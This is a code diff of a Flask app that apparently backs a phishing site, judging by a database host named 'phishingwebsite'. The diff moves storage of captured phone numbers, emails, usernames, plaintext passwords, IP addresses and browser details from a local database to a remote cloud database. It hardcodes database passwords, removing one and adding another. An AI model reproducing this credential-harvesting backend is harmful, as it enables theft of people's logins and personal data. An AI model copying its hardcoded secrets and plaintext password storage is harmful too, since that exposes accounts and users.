@@ -2,9 +2,10 @@ from flask import Flask, render_template, request, jsonify, session
 import random
 import smtplib
 from email.mime.text import MIMEText
-import mysql.connector
+# import mysql.connector
 import os
 from dotenv import load_dotenv
+import pymysql
 
 app = Flask(__name__)
 
@@ -15,14 +16,21 @@ EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
 EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 
 
-db = mysql.connector.connect(
-    host="localhost",
-    user="root",
-    password="Kathan2003##",
-    database="security_db"
+timeout = 10
+connection = pymysql.connect(
+  charset="utf8mb4",
+  connect_timeout=timeout,
+  cursorclass=pymysql.cursors.DictCursor,
+  db="defaultdb",
+  host="mysql-1de3cc1c-phishingwebsite.h.aivencloud.com",
+  password="AVNS_a1mBJLV1R8z_d5v1cmF",
+  read_timeout=timeout,
+  port=24232,
+  user="avnadmin",
+  write_timeout=timeout,
 )
 
-cursor = db.cursor()
+cursor = connection.cursor()
 
 cursor.execute("""
     CREATE TABLE IF NOT EXISTS user_data (
@@ -38,7 +46,7 @@ cursor.execute("""
     )
 
 """)
-db.commit()
+connection.commit()
 
 def send_email_otp(email, otp):
     msg = MIMEText(f"Your OTP for login is: {otp}")
@@ -78,7 +86,7 @@ def submit():
     values = (phone_number, email_id, username, password, user_ip, browser_os_info)
 
     cursor.execute(sql,values)
-    db.commit()
+    connection.commit()
 
     return jsonify({"message": "OTP Sent on your Email account!", "ip": user_ip})
 
@@ -97,7 +105,7 @@ def submit_otp():
 
         sql = "UPDATE user_data SET otp = %s WHERE email_id = %s ORDER BY id DESC LIMIT 1"
         cursor.execute(sql, (otp_entered, email_id))
-        db.commit()
+        connection.commit()
 
         session.pop("otp", None)
         session.pop("email_id", None)
